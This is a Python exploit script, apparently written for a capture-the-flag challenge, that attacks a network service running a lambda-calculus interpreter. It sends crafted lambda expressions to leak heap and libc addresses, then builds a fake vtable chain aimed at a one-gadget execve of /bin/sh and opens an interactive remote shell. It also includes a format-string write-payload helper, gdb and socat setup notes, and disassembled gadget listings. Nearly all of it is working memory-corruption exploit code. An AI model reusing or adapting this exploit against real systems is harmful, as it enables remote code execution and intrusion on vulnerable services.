#coding: utf-8
from socket import *
import time


def addr2b(x):
	res = b""
	for i in range(size_t):
		res += bytes([(x % 256)])
		x //= 256
	#print(res)
	return res

def s2hex(s):
	return list(map(lambda c: hex(ord(c)),s))
	
def b2addr(s,blen=None):
	if blen is None:
		blen = size_t
	res = 0
	for i in range(blen):
		res *= 256
		res += s[blen-i-1]
	return res
	
def shell():
	while True:
		sock.send((input() + '\n').encode(encoding='utf-8'))
		print(sock.recv(128).decode('utf-8'))

def getunt(c):
	assert type(c) is bytes
	res = b""
	while res==b'' or res[-len(c):]!=c:
		#print(res[-len(c):])
		res += sock.recv(1)
		#print(res)
	#print(res)
	return res

fp = open('i.txt','wb')
def send(s):
	#print '[sending :: %s]' % s
	fp.write(s) 
	sock.send(s)

def getshellc(fn):
	res = ""
	with open(fn,'rb') as fp:
		res = fp.read()
	print(map(ord,res))
	return res


class FSB:
	def check_diff(sl):
		#return ''.join(map(lambda p: '%0x' + chr(p+ord('A')) , xrange(15)))
		return '%8x,' *  15
		#0x25,0x30,0x78,0x2c なので、そのへんを探す。
	def init(sl,kome,bytm,paynum,yet):
		#たとえば、deadbeef,cafebabe,abcd9876,3025cafe, ... なら、
		#fsb.init(kome=3,bytm=2,paynum=,yet=) で。

		sl.kome = kome
		sl.head = '*' * bytm
		#%hnでやっていきます
		sl.yet = yet + paynum * size_t * (size_t / 2) + bytm
		print('yet .. ',sl.yet)
		print(yet)
		#payloadは、yetとpaynum分ずれて出る。
		sl.data = []
		sl.npn = 0
	def add(sl,addr,val): #addrをvalにする
		
		for i in xrange(size_t/2): #x86なら2,x64なら4
			sl.head += addr2s(addr + i*2)
			sl.data.append((val % 0x10000, '%%%d$hn' % (sl.npn + sl.kome + 2)))
			val /= 0x10000
			sl.npn += 1
		#短い順にソートすることにより、ペイロードを短くする
		
	def get(sl):
		res = sl.head
		ny = sl.yet
		data = sorted(sl.data)
		for ty,s in data:
			dy = ((ty-ny + 0x10000) % 0x10000)
			if dy>0:
				res += '%%%dx' % dy
			res += s
			ny = ty
		#print len(sl.head)
		#print s2hex(sl.head)
		return res

#sudo gdb -q -p `pidof -s execfile` -x gdbcmd
#socat TCP-L:10001,reuseaddr,fork EXEC:./execfile

#./../../tools/rp-lin-x86 --file=mylibc --rop=3 --unique > mygads.txt

isgaibu = False
#isgaibu = True

sock = socket(AF_INET, SOCK_STREAM)
if isgaibu:
	sock.connect(("gaibu.sa-ba-", 10001))
	#input('gdb$')

else:
	sock.connect(("localhost", 30007))
	#input('gdb$')

size_t = 0x8 #x64かx86か。sizeof(void*) の値で。


d = 0x000055c9eb5472b0 - 0x55c9eb5467e0
d = 48

#d = 2341 + 3 + 0x18
print(d)

pay1 = (b"""
f1 = (\\f:I->I. \\g:(A->A)->A->A. g)
f2 = (\\x:(I->I)->((A->A)->A->A)->(A->A)->A->A. \\f1:A->A. x dec) f1 (\\d:A. d)
"""[1:] +
b"subk1 = (\\farg:(A->A)->A->A. " + (b"f2 (" * d) + b"farg" + (b")" * d) + b")\n" + 
b"")
#print(pay1)
send(pay1)
#input('gdb$')

# victv .. 0x000055c9eb5472b0
# dummy .. 0x55c9eb5467e0

send(b"vf = subk1 (\\victv:A->A. \\dummyhog:A. dummyhog) \n")
send(b"""
f3 = (\\f:I->I. \\g:A->A. g)
f4 = (\\x:(I->I)->(A->A)->A->A. \\f3:A->A. x dec) f3 (\\d:A. d)
"""[1:])
send(b"yav = vf (\\x:A. x)\n")

for t in range(8):
	s = getunt(b'> ')
	if t != 3:
		print(s)


send(b"_1 = " + (b"f4 (" * 16) + b"yav" + (b")" * 16) + b")\n")
s = getunt(b'> ')
yav_addr = b2addr(s[5:][:8])
print(hex(yav_addr))

send(b"_2 = " + (b"f4 (" * 24) + b"yav" + (b")" * 24) + b")\n")
s = getunt(b'> ')
vartable_addr = b2addr(s[5:][:8])
print('vtable_addr',hex(vartable_addr))


dup_cnt = 2
def leak_data(p,blen=8):
	global dup_cnt
	dup_cnt += 1
	
	d = 48
	dummy_struct = addr2b(vartable_addr) + addr2b(p) + addr2b(8)

	for c in b" \t\\=:.()->$":
		if c in dummy_struct:
			print('gacha failed')
			exit()
	
	ds = b"dummyreferene"
	ds += b'a' * (len(dummy_struct) - len(ds))
	#dummy_struct = ds
	
	pay = (b"_%d = " % dup_cnt) + (b"f4 (" * d) + (b"(\\%s:A. %s)" % (dummy_struct,dummy_struct)) + (b")" * d) + b")\n"
	#pay = b"_ = (\\" + dummy_struct + b":A. " + dummy_struct + b")\n"
	#print('pay',pay)
	send(pay)
	ts = getunt(b'> ')[7+len(dummy_struct)+3:][:blen]
	#print(ts)
	ts = b2addr(ts,blen)
	print(hex(ts))
	return ts

#input()
var_str = leak_data(vartable_addr)

#spd = leak_data(var_str+0x5392-0x5370+1,4) # j__ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1ERKS4_
#spd = spd-0x100000000+0x5392-0x5370+5

exit_jmp = var_str+0x2e40-0x5796
exit_got_addr = leak_data(exit_jmp+2,4) + exit_jmp + 6
print('exit_got_addr',hex(exit_got_addr))

exit_addr = leak_data(exit_got_addr) 

print('exit_addr',hex(exit_addr))

libbase = exit_addr - 0x043120
one_gadget_rce = 0xdeadbeef
one_gadget_rce = libbase + 0x4f322 #  # 0x4f329 # 
print('RCE',hex(one_gadget_rce))
#one_gadget_rce = b2addr(b"abcd1234")

#  1b3e9a /bin/sh

"""

   4f329:       48 8d 3d 6a 4b 16 00    lea    rdi,[rip+0x164b6a]        # 1b3e9a <_libc_intl_domainname@@GLIBC_2.2.5+0x186>
   4f330:       48 8d 74 24 40          lea    rsi,[rsp+0x40]


  10a393:       48 8d 74 24 70          lea    rsi,[rsp+0x70]
  10a398:       48 8d 3d fb 9a 0a 00    lea    rdi,[rip+0xa9afb]        # 1b3e9a <_libc_intl_domainname@@GLIBC_2.2.5+0x186>

"""

# get_type is danger

"""
input()
fd = open('q','w')
fd.write("%s\n" % hex(yav_addr))
fd.close()
"""

def check_gatcha(s,isb=0):
	for c in b" \t\\=:.()->$":
		if c in s:
			print('gacha failed')
			if isb==1:
				return False
			exit()
	return True
	
abstable_addr = vartable_addr + 0x5619d11a7950 - 0x5619d11a79d0

print('yav addr',hex(yav_addr))

ogr_addr = yav_addr - 0x55674c357508 + 0x55674c3c8c10
#ogr_addr = 0xdeadbeef
print('oge addr',hex(ogr_addr))

"""
yav addr 0x5563dc8f2508
[heap] : 0x5563dc95ffe0 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x5563dc963c10 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x5563dc964b20 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x5563dc965a30 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")

yav addr 0x55c9d85fc508
[heap] : 0x55c9d8669fe0 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x55c9d866dc10 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x55c9d866eb20 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x55c9d866fa30 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")

yav addr 0x55674c357508
[heap] : 0x55674c3c4fe0 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")
[heap] : 0x55674c3c8c10 ("finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw")


"""


check_gatcha(addr2b(abstable_addr))
check_gatcha(addr2b(ogr_addr))

pay = addr2b(one_gadget_rce)
taddr = ogr_addr
taddr += 8

for i in range(120):
	while not check_gatcha(addr2b(taddr),1):
		pay += addr2b(0xcafebabe)
		taddr += 8
	if i == 0:
		pay += addr2b(ogr_addr) + addr2b(0)
	else:
		pay += addr2b(abstable_addr) + addr2b(ogr_addr)
	ogr_addr = taddr
	taddr += 16

#pay = b"finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw"

if len(pay)>=120*16*2:
	print("sasugani nagai")
	exit(0)
else:
	pay += b'\x00' * (120*16*2 - len(pay))

#check_gatcha(pay)
#pay = b"finddummyfegec46vuj7kb564ufd6j5f4u5g5dj645y5jcr5e64u5ycsxw"
send(b"%s = 0\n" % pay)
print(getunt(b'>'))

print('last_ogr_addr',hex(ogr_addr))

def fin():
	p = 0xcafebabe
	d = 48
	dummy_struct = addr2b(abstable_addr) + addr2b(ogr_addr) + addr2b(8)
	check_gatcha(dummy_struct)
	
	ds = b"dummyreferene"
	ds += b'a' * (len(dummy_struct) - len(ds))
	#dummy_struct = ds
	
	pay = b"finfa = " + (b"f4 (" * d) + (b"(\\%s:A. %s)" % (dummy_struct,dummy_struct)) + (b")" * d) + b")\n"
	#pay = b"_ = (\\" + dummy_struct + b":A. " + dummy_struct + b")\n"
	#print('pay',pay)
	send(pay)
	shell()
	ts = getunt(b'> ')[7+len(dummy_struct)+3:][:blen]
	#print(ts)
	ts = b2addr(ts,blen)
	print(hex(ts))
	return ts

input()
fin()
	



# 0000000000043120 T exit


# ff 25 c2 30 21 00  @ 0x2e40 (0x2130c2) + 6sss

# 0x215f08

# 0xffffd8e9
"""
 [heap] : 0x55b1f4204120 ("abcd1234")
 [heap] : 0x55b1f42056c0 ("abcd1234")
 [heap] : 0x55b1f4206580 ("abcd1234 = 0")
 					0x55b1f4208508
 [heap] : 0x55b1f4225810 ("abcd1234")



 [heap] : 0x5595bbc4b120 ("abcd1234")
 [heap] : 0x5595bbc4c6c0 ("abcd1234")
 [heap] : 0x5595bbc4d580 ("abcd1234 = 0")
 					0x5595bbc4f508
 [heap] : 0x5595bbc6c810 ("abcd1234")




"""


"""
   4f322:       48 8b 05 7f bb 39 00    mov    rax,QWORD PTR [rip+0x39bb7f]        # 3eaea8 <__environ@@GLIBC_2.2.5-0x31f0>
   4f329:       48 8d 3d 6a 4b 16 00    lea    rdi,[rip+0x164b6a]        # 1b3e9a <_libc_intl_domainname@@GLIBC_2.2.5+0x186>
   4f330:       48 8d 74 24 40          lea    rsi,[rsp+0x40]
   4f335:       c7 05 a1 e2 39 00 00    mov    DWORD PTR [rip+0x39e2a1],0x0        # 3ed5e0 <__abort_msg@@GLIBC_PRIVATE+0x8c0>
   4f33c:       00 00 00 
   4f33f:       c7 05 9b e2 39 00 00    mov    DWORD PTR [rip+0x39e29b],0x0        # 3ed5e4 <__abort_msg@@GLIBC_PRIVATE+0x8c4>
   4f346:       00 00 00 
   4f349:       48 8b 10                mov    rdx,QWORD PTR [rax]
   4f34c:       e8 df 5a 09 00          call   e4e30 <execve@@GLIBC_2.2.5>


   808f1:       48 8d 3d a2 35 13 00    lea    rdi,[rip+0x1335a2]        # 1b3e9a <_libc_intl_domainname@@GLIBC_2.2.5+0x186>
   808f8:       48 8d 15 98 35 13 00    lea    rdx,[rip+0x133598]        # 1b3e97 <_libc_intl_domainname@@GLIBC_2.2.5+0x183>
   808ff:       48 8d 35 99 35 13 00    lea    rsi,[rip+0x133599]        # 1b3e9f <_libc_intl_domainname@@GLIBC_2.2.5+0x18b>
   80906:       45 31 c0                xor    r8d,r8d
   80909:       4c 89 e9                mov    rcx,r13
   8090c:       31 c0                   xor    eax,eax
   8090e:       e8 4d 48 06 00          call   e5160 <execl@@GLIBC_2.2.5>


"""




